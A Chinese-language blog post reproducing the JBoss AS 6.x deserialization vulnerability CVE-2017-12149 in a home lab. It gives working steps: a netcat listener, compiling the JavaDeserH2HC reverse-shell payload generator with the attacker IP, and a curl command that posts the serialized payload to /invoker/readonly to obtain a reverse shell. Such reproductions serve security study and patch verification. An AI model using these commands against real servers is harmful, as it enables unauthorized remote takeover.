---
layout:     post
title:      【漏洞复现】Jboss AS 6.X 反序列化漏洞复现（CVE-2017-12149）
subtitle:   反序列化漏洞
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 
---

## 0x00 漏洞说明
JBOSS Application Server是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用，2006年，JBoss被Redhat公司收购。

2017年8月30日，厂商Redhat发布了一个JBOSSAS 5.x 的反序列化远程代码执行漏洞通告。该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。但近期有安全研究者发现JBOSSAS 6.x也受该漏洞影响，攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控制权。JBOSSApplication Server反序列化命令执⾏漏洞。

## 0x01 影响版本
JBoss5.x-6.x
## 0x02 复现环境
win10
kali
jboss-6.1.0.Final
JavaDeserH2HC
## 0x03 漏洞复现
下载jboss-as-6.1.0-final http://jbossas.jboss.org/downloads/ 解压并添加环境变量
```
C:\JBOSS\jboss-6.1.0.Final 
%JBOSS_HOME%\bin
```
run.bat -b 0.0.0.0 运行 Jboss
![-c833](/img/16027835626091.jpg)

访问 http://192.168.111.183:8080/
![-c907](/img/16027835738963.jpg)
访问 http://192.168.111.183:8080/invoker/readonly 若显示HTTP Status 500 -,则漏洞可能存在。 
![-c932](/img/16027835849283.jpg)
开启监听4444端口,nc -vlp 4444 
![-c950](/img/16027835967956.jpg)

下载反序列化⼯具: http://scan.javasec.cn/java/JavaDeserH2HC.zip
```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap IP:4444
（IP是kali的ip,4444是下面要监听的端口，这里写哪个端口下面就要监听哪个端口）
```
这个时候在这个⽬录下⽣成⼀个ReverseShellCommonsCollectionsHashMap.ser⽂件
curl http://IP:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
![-c948](/img/16027836090572.jpg)
成功反弹shell
![-c610](/img/16027836199322.jpg)

